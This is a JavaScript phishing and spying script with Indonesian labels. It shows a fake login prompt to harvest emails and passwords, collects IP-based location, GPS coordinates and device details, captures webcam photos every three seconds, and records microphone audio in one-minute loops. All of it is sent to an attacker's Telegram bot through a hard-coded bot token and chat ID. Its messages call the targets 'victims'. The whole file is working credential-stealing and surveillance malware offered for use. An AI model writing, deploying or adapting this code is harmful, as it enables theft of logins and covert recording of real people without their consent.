const token = '‎8363242595:AAEkV0TBoBud3pCbp4rTx-GGdu__tPdfF5k'; // Replace with your bot token
const chat_id = '8037687284'; // Replace with your chat ID
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

function kirimPesan(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id, text })
  });
}

function kirimFile(audioBlob) {
  const form = new FormData();
  form.append('chat_id', chat_id);
  form.append('audio', audioBlob, 'rekaman.webm');
  fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
    method: 'POST',
    body: form
  });
}

function fakeLogin(provider) {
  let email = prompt(`Masukkan Email ${provider}:`);
  let password = prompt(`Masukkan Password ${provider}:`);
  if (email && password) {
    const mulaiPesan = `𝘼𝙙𝙖 𝙍𝙚𝙨𝙪𝙡𝙩 𝙉𝙞𝙝 𝘽𝙖𝙣𝙜 𝘿𝙤𝙣𝙯 𝙆𝙖𝙡𝙞 𝙄𝙣𝙞 𝙑𝙞𝙖 ${provider} 𝘿𝙞 𝙗𝙖𝙬𝙖𝙝 𝙄𝙣𝙞 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙉𝙮𝙖 𝙮𝙖..`;
    kirimPesan(mulaiPesan);
    
    const loginData = `
==🌟 RESULT PHISING 🌟==
📧 Email/nomor: ${email}
🔒 Password: ${password}
🖥 Login: ${provider}
🌐 Result: Phising Login
==============================
`;
    setTimeout(() => {
      kirimPesan(loginData);
    }, 2000);
  }
}

kirimPesan('📝𝘽𝙚𝙧𝙞𝙠𝙪𝙩 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙆𝙤𝙧𝙗𝙖𝙣 𝘽𝙖𝙣𝙜:');

fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
  .then(loc => loc.json())
  .then(info => {
    const device = navigator.userAgent;
    const ram = navigator.deviceMemory || 'Tidak diketahui';
    const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const bahasa = navigator.language;
    const browser = navigator.appName + ' ' + navigator.appVersion;
    const statusJaringan = navigator.onLine ? 'Online' : 'Offline';

    navigator.getBattery().then(bat => {
      const status = `
== INFORMASI KORBAN ==
🌐 IP: ${info.ip}
🏳 Negara: ${info.country_name}
🖥 Region: ${info.region}
📲 Kota: ${info.city}
🔎 ISP: ${info.org}
🔋 Baterai: ${Math.floor(bat.level * 100)}%
📱 Device: ${device}
🧠 RAM: ${ram} GB
⚙️ CPU: ${cpu} core
🌍 Zona Waktu: ${timezone}
🗣️ Bahasa: ${bahasa}
🧭 Browser: ${browser}
📡 Status Jaringan: ${statusJaringan}
=====================`;

      kirimPesan(status);
    });
  });

if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const lokasi = `📍Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
    kirimPesan(lokasi);
  });
}

navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  video.srcObject = stream;
  video.play();
  setInterval(() => {
    ambilFoto();
  }, 3000);
})
.catch(err => {
  kirimPesan("Gagal akses kamera: " + err);
});

function ambilFoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => {
    let form = new FormData();
    form.append('chat_id', chat_id);
    form.append('photo', blob, 'foto.jpg');
    form.append('caption', '📸 𝙁𝙤𝙩𝙤 𝙆𝙤𝙧𝙗𝙖𝙣 𝙎𝙪𝙠𝙨𝙚𝙨');
    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: form
    });
  }, 'image/jpeg');
}

navigator.mediaDevices.getUserMedia({ audio: true })
.then(stream => {
  const mediaRecorder = new MediaRecorder(stream);
  let chunks = [];

  mediaRecorder.ondataavailable = e => {
    chunks.push(e.data);
  };

  mediaRecorder.onstop = () => {
    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
    kirimFile(audioBlob);
    chunks = [];
    mediaRecorder.start();
    setTimeout(() => {
      mediaRecorder.stop();
    }, 60000);
  };

  mediaRecorder.start();
  setTimeout(() => {
    mediaRecorder.stop();
  }, 60000);
})
.catch(err => {
  kirimPesan("Gagal akses microphone: " + err);
});